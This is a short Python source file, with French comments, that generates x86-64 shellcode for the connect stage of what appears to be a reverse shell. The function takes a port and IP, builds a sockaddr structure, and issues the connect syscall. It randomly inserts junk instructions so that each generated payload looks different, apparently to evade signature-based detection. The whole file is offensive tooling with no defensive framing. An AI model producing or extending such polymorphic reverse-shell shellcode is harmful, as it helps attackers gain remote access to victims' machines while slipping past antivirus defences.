#!/usr/bin/env python3
import random
from func_instu import *

def partie2(port, ip):

    subrsp = '\\x48\\x83\\xec\\x08' # sub rsp, 8
    movb = movx('b', 2) # mov BYTE[rsp],0x2
    movw1 = f'\\x66\\xc7\\x44\\x24\\x02\\{port}' # mov WORD[rsp+0x2], {PORT HEXA Little IDIAN}
    movw2 = f'\\xc7\\x44\\x24\\x04\\{ip}'
    movrsi = movregx('rsi', 'e6') # mov rsi, rsp
    movdl = movx('dl', 16) # mov dl, 16
    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    moval = movx('al', 42) # mov al, 42
    syscall = '\\x0f\\x05' # syscall
    
    # Concaténation de toutes les variables
    resultat_concat = subrsp + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall

    y = random.randint(0, 3)

    match y : 
        case 1 :
            resultat_concat = subrsp + full_random() + movb + movw1 + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall
        case 2 : 
            print("1")
            resultat_concat = subrsp + full_random()  + movb + movw1 + full_random() + movw2 + movrsi + movdl + pushr8 + poprdi + moval + syscall
        case 3 :
            print("2")
            resultat_concat = subrsp + full_random() + movb + full_random()  + movw1 + movw2 + movrsi + full_random() + movdl + pushr8 + poprdi + moval + syscall

    print(f"Partie 2 = {resultat_concat}")
    print("")
    
    return resultat_concat  
